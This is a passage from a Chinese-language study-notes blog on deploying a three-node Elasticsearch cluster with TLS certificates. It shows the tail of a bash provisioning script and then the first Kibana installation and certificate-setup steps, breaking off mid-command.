class="hljs-keyword">do</span><br>        retry_count=$((retry_count + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$retry_count</span>&quot;</span> -ge <span class="hljs-string">&quot;<span class="hljs-variable">$max_retries</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 chrony 已尝试 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次，仍然失败&quot;</span> &gt;&amp;2<br>            <span class="hljs-built_in">exit</span> 1<br>        <span class="hljs-keyword">fi</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装失败，第 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次重试，立即重新尝试...&quot;</span><br>        <span class="hljs-built_in">sleep</span> 2<br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chrony 安装完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 时间同步 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始时间同步&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;正在启动 chrony 服务...&quot;</span><br><span class="hljs-keyword">if</span> systemctl <span class="hljs-built_in">enable</span> chrony &amp;&amp; systemctl start chrony; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chrony 服务已启动&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;启动 chrony 失败&quot;</span> &gt;&amp;2<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 创建 es 用户 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始创建 es 用户&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;删除已有 es 用户（包括其主目录）&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-string">&quot;es&quot;</span> &amp;&gt;/dev/null; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检测到已有 es 用户，正在删除...&quot;</span><br>    userdel -r es<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已删除旧的 es 用户&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;新增 es 用户&quot;</span><br>useradd -m -s /bin/bash es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;为 es 用户设置密码（wq666）&quot;</span><br>passwd es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建 es 用户完成&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. id &quot;</span>es<span class="hljs-string">&quot;</span><br><span class="hljs-string">1. 用于检查 es 用户是否存在</span><br><span class="hljs-string">2. 如果存在，会输出例如：uid=1001(es) gid=1001(es) groups=1001(es)</span><br><span class="hljs-string">2. userdel -r es</span><br><span class="hljs-string">1. 删除用户和其主目录</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 关闭 Swap 分区 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始关闭 Swap 分区&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;将 内容注释&quot;</span><br>sed -i <span class="hljs-string">&#x27;/^[^#].*\bswap\b/ s/^/#/&#x27;</span> /etc/fstab<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;立即关闭 Swap 分区&quot;</span><br>swapoff -a<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;关闭 Swap 分区完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 开放 9200、9300 TCP 端口 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始开放 9200、9300 TCP 端口&quot;</span><br>ufw allow 9200/tcp &amp;&amp; ufw allow 9300/tcp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开放 9200、9300 TCP 端口完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 设置主机名、主机名互相解析 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始设置主机名、主机名互相解析&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;获取本机内网 IP 地址&quot;</span><br>INTERFACE=$(ip <span class="hljs-built_in">link</span> | grep -oP <span class="hljs-string">&#x27;^[0-9]+: \K[^:]+&#x27;</span> | grep -v lo | <span class="hljs-built_in">head</span> -1)<br>LOCAL_IP=$(ip addr show <span class="hljs-string">&quot;<span class="hljs-variable">$INTERFACE</span>&quot;</span> | grep -oP <span class="hljs-string">&#x27;inet \K[\d.]+&#x27;</span> | <span class="hljs-built_in">head</span> -1)<br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;不能获取本机 IP 地址&quot;</span> &gt;&amp;2<br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;本机内网 IP 地址获取成功：<span class="hljs-variable">$LOCAL_IP</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置本机主机名&quot;</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> <span class="hljs-keyword">in</span><br>    <span class="hljs-string">&quot;192.168.136.8&quot;</span>)<br>        HOSTNAME=<span class="hljs-string">&quot;es-node1&quot;</span><br>        ;;<br>    <span class="hljs-string">&quot;192.168.136.9&quot;</span>)<br>        HOSTNAME=<span class="hljs-string">&quot;es-node2&quot;</span><br>        ;;<br>    <span class="hljs-string">&quot;192.168.136.10&quot;</span>)<br>        HOSTNAME=<span class="hljs-string">&quot;es-node3&quot;</span><br>        ;;<br>    *)<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;IP <span class="hljs-variable">$LOCAL_IP</span> does not match any configured hostname&quot;</span> &gt;&amp;2<br>        <span class="hljs-built_in">exit</span> 1<br>        ;;<br><span class="hljs-keyword">esac</span><br>hostnamectl set-hostname <span class="hljs-string">&quot;<span class="hljs-variable">$HOSTNAME</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置主机名互相解析&quot;</span><br>HOSTS_CONTENT=<span class="hljs-string">&quot;</span><br><span class="hljs-string">192.168.136.8   es-node1</span><br><span class="hljs-string">192.168.136.9   es-node2</span><br><span class="hljs-string">192.168.136.10  es-node3&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查 /etc/hosts 是否已包含指定追加内容&quot;</span><br><span class="hljs-keyword">if</span> grep -Fx <span class="hljs-string">&quot;<span class="hljs-variable">$HOSTS_CONTENT</span>&quot;</span> /etc/hosts &gt; /dev/null; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;主机名解析记录已存在，跳过添加&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$HOSTS_CONTENT</span>&quot;</span> &gt;&gt; /etc/hosts<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;主机名解析记录已添加&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置主机名、主机名互相解析完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 安装 ES ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 ES&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 /mystudy/es 目录&quot;</span><br><span class="hljs-built_in">cd</span> /mystudy/es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;删除已存在 ES 目录&quot;</span><br><span class="hljs-keyword">if</span> [ -d <span class="hljs-string">&quot;<span class="hljs-variable">$work_directory</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检测到已存在 ES 目录，准备删除...&quot;</span><br>    <span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&quot;<span class="hljs-variable">$work_directory</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ES 目录已删除&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查是否存在 ES 安装包&quot;</span><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$es_package</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ES 安装包不存在&quot;</span> &gt;&amp;2<br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;解压&quot;</span><br>tar -zxvf <span class="hljs-variable">$es_package</span> -C /mystudy/es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;重命名&quot;</span><br><span class="hljs-built_in">mv</span> <span class="hljs-string">&quot;<span class="hljs-variable">$es_init_name</span>&quot;</span> elasticsearch<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 ES 完成&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. [ -d &quot;</span>path<span class="hljs-string">&quot; ]:</span><br><span class="hljs-string">1. path 是一个存在的目录吗？</span><br><span class="hljs-string">2. 类似的有：</span><br><span class="hljs-string">1. -f &quot;</span>path<span class="hljs-string">&quot;：</span><br><span class="hljs-string">1. path 是一个存在的文件吗？</span><br><span class="hljs-string">2. -e &quot;</span>path<span class="hljs-string">&quot;：</span><br><span class="hljs-string">1. path 是一个存在的路径吗？（文件或目录）</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 创建存放 ES 数据的目录 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始创建存放 ES 数据的目录&quot;</span><br><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$work_directory</span>/data<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建存放 ES 数据的目录完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 创建存放证书的目录 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始创建存放证书的目录&quot;</span><br><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$work_directory</span>/config/certs<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建存放证书的目录完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 生成 CA 证书、CA 公钥（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在 192.168.136.8 上生成 CA 证书、CA 公钥&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 ES 目录&quot;</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$work_directory</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;签发 ca 证书&quot;</span><br>    bin/elasticsearch-certutil ca<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;导出 CA 公钥&quot;</span><br>    openssl pkcs12 -<span class="hljs-keyword">in</span> elastic-stack-ca.p12 -nokeys -out ca.crt<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;将 CA 证书、CA 公钥放到存放证书目录下&quot;</span><br>    <span class="hljs-built_in">mv</span> elastic-stack-ca.p12 ca.crt <span class="hljs-variable">$work_directory</span>/config/certs/<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;生成 CA 证书、CA 公钥完成&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-comment"># -------------------------------- 签发节点证书（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在 192.168.136.8 上签发节点证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 ES 目录&quot;</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$work_directory</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;批量签发节点证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建并编辑 instances.yml&quot;</span><br>    <span class="hljs-built_in">cat</span> &gt; instances.yml &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">instances:</span><br><span class="hljs-string">  - name: es-node1</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.8&quot;</span><br><span class="hljs-string">  - name: es-node2</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.9&quot;</span><br><span class="hljs-string">  - name: es-node3</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.10&quot;</span><br><span class="hljs-string">EOF</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进行批量签发&quot;</span><br>    bin/elasticsearch-certutil cert \<br>        --silent \<br>        --<span class="hljs-keyword">in</span> instances.yml \<br>        --ca config/certs/elastic-stack-ca.p12 \<br>        --pem \<br>        --out certs.zip<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;将 certs.zip 放到存放证书目录下&quot;</span><br>    <span class="hljs-built_in">mv</span> certs.zip config/certs/<br>    <span class="hljs-built_in">rm</span> -rf instances.yml<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;签发节点证书完成&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-comment"># -------------------------------- 签发 HTTPS 证书（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在192.168.136.8 上签发 HTTPS 证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 ES 目录&quot;</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$work_directory</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;批量签发 HTTPS 证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建并编辑 http-instances.yml&quot;</span><br>    <span class="hljs-built_in">cat</span> &gt; http-instances.yml &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">instances:</span><br><span class="hljs-string">  - name: es-node1-http</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.8&quot;</span><br><span class="hljs-string">  - name: es-node2-http</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.9&quot;</span><br><span class="hljs-string">  - name: es-node3-http</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.10&quot;</span><br><span class="hljs-string">EOF</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进行批量签发&quot;</span><br>    bin/elasticsearch-certutil cert \<br>      --silent \<br>      --<span class="hljs-keyword">in</span> http-instances.yml \<br>      --ca  config/certs/elastic-stack-ca.p12 \<br>      --pem \<br>      --out http-certs.zip<br>    <span class="hljs-built_in">mv</span> http-certs.zip config/certs/<br>    <span class="hljs-built_in">rm</span> -rf http-instances.yml<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;签发 HTTPS 证书完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 分发证书（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在 192.168.136.8 上分发证书&quot;</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$work_directory</span>/config/certs<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发节点证书&quot;</span><br>    unzip certs.zip <br>    <span class="hljs-built_in">mv</span> <span class="hljs-variable">$work_directory</span>/config/certs/es-node1/es-node1.&#123;crt,key&#125; <span class="hljs-variable">$work_directory</span>/config/certs/<br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/es-node2/es-node2.&#123;crt,key&#125; \<br>        root@192.168.136.9:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/es-node3/es-node3.&#123;crt,key&#125; \<br>        root@192.168.136.10:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发HTTPS 证书&quot;</span><br>    unzip http-certs.zip<br>    <span class="hljs-built_in">mv</span> <span class="hljs-variable">$work_directory</span>/config/certs/es-node1-http/es-node1-http.&#123;crt,key&#125; <span class="hljs-variable">$work_directory</span>/config/certs/<br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/es-node2-http/es-node2-http.&#123;crt,key&#125; \<br>        root@192.168.136.9:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/es-node3-http/es-node3-http.&#123;crt,key&#125; \<br>        root@192.168.136.10:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发 CA 公钥&quot;</span><br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/ca.crt \<br>        root@192.168.136.9:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/ca.crt \<br>        root@192.168.136.10:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    <span class="hljs-built_in">rm</span> -rf es-node1 es-node1-http es-node2 es-node2-http es-node3 es-node3-http certs.zip http-certs.zip<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发证书完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 修改 ES 文件拥有者为 es ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始修改 ES 文件拥有者为 es&quot;</span><br><span class="hljs-built_in">chown</span> -R es:es <span class="hljs-variable">$work_directory</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;修改 ES 文件拥有者为 es 完成&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;本节点脚本执行结束&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-高可用生产集群搭建"><a href="#3-高可用生产集群搭建" class="headerlink" title="3. 高可用生产集群搭建"></a>3. 高可用生产集群搭建</h3><h3 id="4-常见问题"><a href="#4-常见问题" class="headerlink" title="4. 常见问题"></a>4. 常见问题</h3><h4 id="4-1-停掉几个节点之后，ES-集群不可用"><a href="#4-1-停掉几个节点之后，ES-集群不可用" class="headerlink" title="4.1. 停掉几个节点之后，ES 集群不可用"></a>4.1. 停掉几个节点之后，ES 集群不可用</h4><p>在停掉几个节点后，发现 Elasticsearch 和 Kibana 都无法使用，这很可能是由于 Elasticsearch 集群不可用，可能原因是无法选出主节点。</p><p>我们之前说：Master 节点必须获得 <strong>超过</strong> N&#x2F;2 + 1 的投票（不含“等于”）才能成为 Leader，N 为历史上加入过集群的节点总数，即使节点已下线，其记录仍计入 N。因此我们必须保证集群中大多数节点存活时才可完成选举，例如 3 节点必须保证 2 节点存活。</p><p>所以，通过启动两台服务器，问题应该能得到解决。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>以上说明的前提是：每个节点都是 Master 节点</li></ol></blockquote><hr><h1 id="三、工具"><a href="#三、工具" class="headerlink" title="三、工具"></a>三、工具</h1><h3 id="1-Kibana"><a href="#1-Kibana" class="headerlink" title="1. Kibana"></a>1. Kibana</h3><h4 id="1-1-Kibana-概述"><a href="#1-1-Kibana-概述" class="headerlink" title="1.1. Kibana 概述"></a>1.1. Kibana 概述</h4><p>Kibana 是 ELK 三件套中的 “K”：</p><ul><li><strong>E</strong>lasticsearch：负责数据的存储、计算与搜索</li><li><strong>L</strong>ogstash（或 Filebeat）：负责数据抓取</li><li><strong>K</strong>ibana：负责数据的可视化与分析</li></ul><hr><h4 id="1-2-Kibana-高可用实现"><a href="#1-2-Kibana-高可用实现" class="headerlink" title="1.2. Kibana 高可用实现"></a>1.2. Kibana 高可用实现</h4><h5 id="1-2-1-节点规划"><a href="#1-2-1-节点规划" class="headerlink" title="1.2.1. 节点规划"></a>1.2.1. 节点规划</h5><p>Kibana 的部署数量没有强制要求，也不需要必须部署在 Elasticsearch 所在的服务器上。只要 Kibana 能访问 Elasticsearch 集群，就可以部署在任意一台服务器上。根据集群规模和可用性需求，推荐的部署数量如下：</p><table><thead><tr><th>ES 节点数量</th><th>Kibana 节点数量</th></tr></thead><tbody><tr><td>1 ~ 3 个</td><td>1 个 Kibana 实例即可满足需求</td></tr><tr><td>3 ~ 10 个</td><td>1 ~ 2 个 Kibana + 反向代理 + 负载均衡</td></tr><tr><td>高可用场景</td><td>多个 Kibana 实例 + 反向代理 + 负载均衡</td></tr></tbody></table><hr><h4 id="1-3-Kibana-使用"><a href="#1-3-Kibana-使用" class="headerlink" title="1.3. Kibana 使用"></a>1.3. Kibana 使用</h4><h5 id="1-3-1-节点列表"><a href="#1-3-1-节点列表" class="headerlink" title="1.3.1. 节点列表"></a>1.3.1. 节点列表</h5><p>由于当前处于测试学习阶段，且节点资源有限，暂不考虑实现高可用架构。此处仅部署一个 Kibana 实例，部署位置为服务器 <code>192.168.136.8</code>。</p><table><thead><tr><th>IP</th><th>主机名</th><th>介绍</th></tr></thead><tbody><tr><td>192.168.136.8</td><td>node1</td><td>master-eligible、data、ingest、coordinating、kibana</td></tr></tbody></table><hr><h5 id="1-3-2-下载-Kibana-安装包"><a href="#1-3-2-下载-Kibana-安装包" class="headerlink" title="1.3.2. 下载 Kibana 安装包"></a>1.3.2. 下载 Kibana 安装包</h5><p>从 <a href="https://www.elastic.co/cn/downloads/past-releases#kibana">Kibana 下载地址</a>下载 Kibana 安装包，注意要和 ES 版本一致：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250417102403638.png"></p><hr><h5 id="1-3-3-将-Kibana-安装包上传到机器并解压"><a href="#1-3-3-将-Kibana-安装包上传到机器并解压" class="headerlink" title="1.3.3. 将 Kibana 安装包上传到机器并解压"></a>1.3.3. 将 Kibana 安装包上传到机器并解压</h5><p>在此步骤中，我将 Kibana 安装包上传至 <code>/mystudy/kibana</code> 目录，并直接在该目录中进行了解压。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 1. 进入目录</span><br><span class="hljs-attribute">cd</span> /mystudy/kibana<br><br><br><span class="hljs-comment"># 2. 解压</span><br><span class="hljs-attribute">tar</span> -zxvf  kibana-<span class="hljs-number">8</span>.<span class="hljs-number">18</span>.<span class="hljs-number">0</span>-linux-x86_64.tar.gz -C /mystudy/kibana<br><br><br><span class="hljs-comment"># 3. 重命名</span><br><span class="hljs-attribute">mv</span> kibana-<span class="hljs-number">8</span>.<span class="hljs-number">18</span>.<span class="hljs-number">0</span> kibana<br></code></pre></td></tr></table></figure><hr><h5 id="1-3-4-为-Kibana-生成-HTTPS-证书"><a href="#1-3-4-为-Kibana-生成-HTTPS-证书" class="headerlink" title="1.3.4. 为 Kibana 生成 HTTPS 证书"></a>1.3.4. 为 Kibana 生成 HTTPS 证书</h5><p>由于我们需要通过浏览器访问 Kibana，并要以 HTTPS 的方式进行安全访问，因此需要为 Kibana 配置 HTTPS 证书。</p><p>如果 kibana 和 es 在同一台服务器上，我们完全可以服用es 的https 证书，当然，如果 es 和 kibana 不在同一服务器上，我们需要为 kibana 整一个https 证书，我们可以使用es 提供的ca签发https 证书，也可以使用自己的方式签发 https 证书，这都无所谓，因为是我们客户端访问kibana，无需ca 一致，当然这是私网，如果公网访问还是要正儿八经去权威ca申请https 证书</p><p>但是建议 ca 一致，如果 Kibana 使用的证书和 Elasticsearch 使用的证书都来自同一个 CA，Elasticsearch 会默认信任来自 Kibana 的请求（如果开启了 <code>xpack.security</code> 和 <code>ssl</code>）。</p><p>那我们用 ca 证书签一个吧，一般在 ca 服务器上，因为有es 提供的cert 工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /mystudy/es/elasticsearch<br><br>bin/elasticsearch-certutil cert \<br>  --name kibana1 \<br>  --ip 192.168.136.8 \<br>  --ca config/certs/elastic-stack-ca.p12 \<br>  --pem \<br>  --out kibana1-certs.zip<br><br><br><br>拿到 kibana1-certs.zip<br><br>解压文件<br>unzip kibana1-certs.zip<br><br><br><span class="hljs-comment"># 4. 将解压后的文件移动到 kibana 的 config 目录</span><br><span class="hljs-built_in">cd</span> /mystudy/kibana/kibana/config<br><br><span class="hljs-built_in">mv</span> kibana/kibana.csr kibana/kibana.key /mystudy/kibana/kibana/config/<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 进入 ES 目录</span><br><span class="hljs-built_in">cd</span> /mystudy/es/elasticsearch<br><br><br><span class="hljs-comment"># 2. 为 Kibana 生成 csr（一次空格）</span><br>bin/elasticsearch-certutil csr -name kibana -dns node1<br><br><br><span class="hljs-comment"># 3. 解压文件</span><br>unzip csr-bundle.zip<br><br><br><span class="hljs-comment"># 4. 将解压后的文件移动到 kibana 的 config 目录</span><br><span class="hljs-built_in">mv</span> kibana/kibana.csr kibana/kibana.key /mystudy/kibana/kibana/config/<br><br><br><span class="hljs-comment"># 5. 进入 Kibana/config 目录</span><br><span class="hljs-built_in">cd</span> /mystudy/kibana/kibana/config<br><br><br><span class="hljs-comment"># 6. 生成自签名证书</span><br>openssl x509 -req -<span class="hljs-keyword">in</span> kibana.csr -signkey kibana.key -out kibana.crt<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>上面的移动，是基于 ES 节点和 Kibana 节点相同，如果不同，自己想办法</li></ol></blockquote><hr><h5 id="1-3-5-为-Kibana-配置服务用户"><a href="#1-3-5-为-Kibana-配置服务用户" class="headerlink" title="1.3.5. 为 Kibana 配置服务用户"></a>1.3.5. 为 Kibana 配置服务用户</h5><p>服务账户专用于 Kibana 与 Elasticsearch 之间的通信，登录 Kibana 时使用的也是这个账户。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 1. 进入 ES 目录</span><br><span class="hljs-keyword">cd</span> <span class="hljs-string">/mystudy/es/elasticsearch</span><br><br><br><span class="hljs-comment"># 2. 设置 kibana 密码（自定义密码）</span><br>curl -k -u elastic:&lt;elastic 密码&gt; -X POST <span class="hljs-string">&quot;https://&lt;随意 ES 